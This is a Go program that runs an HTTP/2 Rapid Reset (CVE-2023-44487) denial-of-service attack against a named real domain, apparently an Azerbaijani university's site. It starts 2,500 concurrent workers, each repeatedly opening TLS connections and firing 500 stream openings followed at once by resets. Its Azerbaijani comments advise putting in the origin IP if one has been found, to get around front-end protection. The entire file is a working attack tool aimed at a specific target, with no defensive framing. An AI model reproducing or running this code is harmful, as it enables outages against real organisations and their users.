package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

var (
	target  = "bbu.edu.az" // Origin IP tapmısınızsa onu yazın
	sni     = "bbu.edu.az"
	workers = 2500
	count   uint64
	errors  uint64
)

func main() {
	fmt.Printf("[!!!] KATAKLİZM-X-FORCE AKTİVDİR: %s\n", sni)
	
	for i := 0; i < workers; i++ {
		go func() {
			for {
				attack()
				time.Sleep(10 * time.Millisecond) // CPU-nu tam kilidləməmək üçün minimal fasilə
			}
		}()
	}

	// Səssiz Hesabat
	for {
		time.Sleep(5 * time.Second)
		fmt.Printf("[HAKAI] RESET: %d | FAIL: %d\n", atomic.LoadUint64(&count), atomic.LoadUint64(&errors))
	}
}

func attack() {
	cfg := &tls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{"h2"},
		ServerName:         sni,
	}

	dialer := net.Dialer{Timeout: 5 * time.Second}
	conn, err := dialer.Dial("tcp", target)
	if err != nil {
		atomic.AddUint64(&errors, 1)
		return
	}
	defer conn.Close()

	tlsConn := tls.Client(conn, cfg)
	if err := tlsConn.Handshake(); err != nil {
		atomic.AddUint64(&errors, 1)
		return
	}
	defer tlsConn.Close()

	// HTTP/2 Preface
	tlsConn.Write([]byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"))

	framer := http2.NewFramer(tlsConn, tlsConn)
	framer.WriteSettings(http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 2000})

	// Rapid Reset (CVE-2023-44487)
	for i := 0; i < 500; i++ {
		streamID := uint32(2*i + 1)
		
		framer.WriteHeaders(http2.HeadersFrameParam{
			StreamID:   streamID,
			EndHeaders: true,
			EndStream:  false,
			BlockFragment: []byte{
				0x82, 0x86, 0x84, 0x41, 0x8c, 0xf1, 0xe3, 0xc2, 0xe5, 0xf2, 0x3a, 0x6b, 0xa0, 0xab, 0x90, 0xf4, 0xff,
			},
		})

		framer.WriteRSTStream(streamID, http2.ErrCodeCancel)
		atomic.AddUint64(&count, 1)
		
		// Sürətli bombardman - saniyədə minlərlə stream ləğvi
		if i%10 == 0 {
			time.Sleep(time.Microsecond)
		}
	}
}
